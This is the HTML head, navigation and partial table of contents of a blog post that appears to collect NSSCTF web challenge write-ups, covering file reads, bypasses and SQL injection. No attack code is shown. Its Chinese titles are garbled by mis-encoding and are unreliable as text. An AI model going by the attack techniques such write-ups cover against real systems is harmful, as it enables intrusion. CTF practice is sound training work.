<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="NSSCTF web åˆ·é¢˜ï¼Œç£ä¿ƒè‡ªå·±ç”¨çš„ï¼Œå›¾å°±ä¸æ”¾äº†ï¼Œå¥½éº»çƒ¦å˜¤å˜¤å˜¤ [SWPU 2018]SimplePHP  ä¸€çœ¼ä»»æ„æ–‡ä»¶è¯»å– è·å–ç›®å½•ä¸‹çš„æ–‡ä»¶ index.php  function.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php &#x2F;&#x2F;show_source(__FILE__">
<meta property="og:type" content="article">
<meta property="og:title" content="NSS-webåˆ·é¢˜">
<meta property="og:url" content="http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/index.html">
<meta property="og:site_name" content="Meteor_Kai">
<meta property="og:description" content="NSSCTF web åˆ·é¢˜ï¼Œç£ä¿ƒè‡ªå·±ç”¨çš„ï¼Œå›¾å°±ä¸æ”¾äº†ï¼Œå¥½éº»çƒ¦å˜¤å˜¤å˜¤ [SWPU 2018]SimplePHP  ä¸€çœ¼ä»»æ„æ–‡ä»¶è¯»å– è·å–ç›®å½•ä¸‹çš„æ–‡ä»¶ index.php  function.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php &#x2F;&#x2F;show_source(__FILE__">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090655640.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090754383.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090905238.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129091157168.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129094525150.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129152014405.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153324392.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153330890.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153602396.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129154720280.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129154816344.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129162734692.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129162758249.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129185322665.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081543495.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081821727.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081952743.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082223713.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082453677.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082658543.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201090321285.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162019665.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162431475.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162925243.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201163048605.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201165516664.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201195030922.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201195811853.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202091606567.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093801748.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093817078.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093953244.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113409968.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113436817.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113745659.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113809806.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202120310235.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202135053653.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202141718720.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202191229996.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202191236455.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192140294.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192401696.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192427751.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192500153.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192515347.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192532428.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202195010229.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203142059441.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203150323022.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151646902.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151737374.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151855387.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203152039720.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203152536667.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203153252371.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203154849744.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155021110.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155429796.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155415823.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203163625594.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183506892.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183619864.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183641915.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204190138226.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204191236394.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204191947252.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204192022368.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205101557977.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205102042424.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205105221482.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205184800886.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205184816327.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205185132883.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205190842283.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205195913384.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205202211925.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205202303024.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206105852832.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206135001872.png">
<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/88f0ac4113ccb65120ad8a4bb3409bda.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206135214358.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206162301273.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206162320564.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206170630174.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206170818784.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206181457145.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206182342197.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241207183625856.png">
<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/b64eaf07acb79400eb4758495127f5a9.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241207191631376.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211091858315.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211092027384.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211150618302.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211194627392.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211194704771.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241213210502761.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216165920626.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216170014770.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216173859525.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216174248130.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217102936436.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162221344.png">
<meta property="og:image" content="http://49.232.222.195/usr/uploads/2024/01/3143471657.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162431715.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162525349.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162550738.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183017666.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183108043.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183711068.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217184946236.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217185044193.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217191850648.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217194810760.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218143940345.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218144520020.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218150653705.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218150726126.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218164943899.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220124913426.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220124906163.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220125010556.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220205948150.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220210832925.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221130223596.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221130251349.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221131100031.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221132103107.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221132132933.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210444624.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210459298.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210551031.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093337918.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093344765.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093408857.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093449718.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102504323.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102518573.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102526079.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102639428.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222111208334.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112240952.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112644143.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112807470.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222113111949.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161153662.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161704265.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161718945.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222162400463.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222164000955.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222163953824.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223104912732.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223104936822.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223105009974.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223105356197.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223113609841.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223113620325.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223130449675.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223130528458.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223165932556.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223170940953.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223171201655.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223172100977.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223172424946.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241224110506682.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241224110501121.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225153946378.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225155117505.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225155204995.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241227153626689.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241227153710490.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241230171141882.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241230171148314.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241231103913709.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241231104320343.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090545818.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090618525.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090736212.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091459532.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091449658.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091544695.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085153202.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085554674.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085700376.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104115507603.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104115941234.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120856200.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120932581.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120944656.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104221216421.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104223600499.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104224546154.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104225223289.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104225321393.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105082600584.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105083934681.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105160042913.png">
<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105160338220.png">
<meta property="article:published_time" content="2025-02-15T05:49:02.000Z">
<meta property="article:modified_time" content="2025-04-03T06:51:38.151Z">
<meta property="article:author" content="Meteor_Kai">
<meta property="article:tag" content="æ‚">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090655640.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>NSS-webåˆ·é¢˜</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About me</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">categories</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/02/16/VNCTF2025-Web-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&text=NSS-webåˆ·é¢˜"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-webåˆ·é¢˜"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&is_video=false&description=NSS-webåˆ·é¢˜"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=NSS-webåˆ·é¢˜&body=Check out this article: http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-webåˆ·é¢˜"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-webåˆ·é¢˜"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-webåˆ·é¢˜"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-webåˆ·é¢˜"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&name=NSS-webåˆ·é¢˜&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&t=NSS-webåˆ·é¢˜"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPU-2018-SimplePHP"><span class="toc-number">1.</span> <span class="toc-text">[SWPU 2018]SimplePHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Double-Secret"><span class="toc-number">2.</span> <span class="toc-text">[CISCN 2019åä¸œå—]Double Secret</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TQLCTF-2022-simple-bypass"><span class="toc-number">3.</span> <span class="toc-text">[TQLCTF 2022]simple_bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">4.</span> <span class="toc-text">[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-number">5.</span> <span class="toc-text">[BJDCTF 2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 